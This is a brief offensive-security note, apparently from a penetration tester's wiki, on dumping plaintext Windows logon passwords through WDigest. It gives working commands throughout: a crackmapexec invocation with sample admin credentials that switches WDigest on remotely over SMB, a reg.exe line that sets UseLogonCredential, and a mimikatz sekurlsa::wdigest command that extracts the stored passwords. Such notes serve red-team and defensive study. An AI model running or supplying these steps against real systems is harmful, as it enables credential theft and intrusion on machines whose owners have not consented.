---
title: Dump WDigest
---

[[notes/windows/credential-access-admin]]

WDigest contains passwords of logged in users in plain text, but is disabled by default since Windows Server 2012 R2 / Windows 8.1.

Set a registry key to reenable WDigest, no reboot required ([source](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/forcing-wdigest-to-store-credentials-in-plaintext)).

=== "[[notes/tools/crackmapexec]]"
    ~~~ bash
    crackmapexec smb 192.168.0.76 -u testadmin -p Password123 -M wdigest -o action=enable
    crackmapexec smb 192.168.0.76 -u testadmin -p Password123 -M wdigest -o action=disable
    ~~~

=== "builtin"
    ~~~ bat
    reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
    ~~~

Dump passwords after new logins.

~~~ bat
.\mimikatz.exe sekurlsa::wdigest exit
~~~
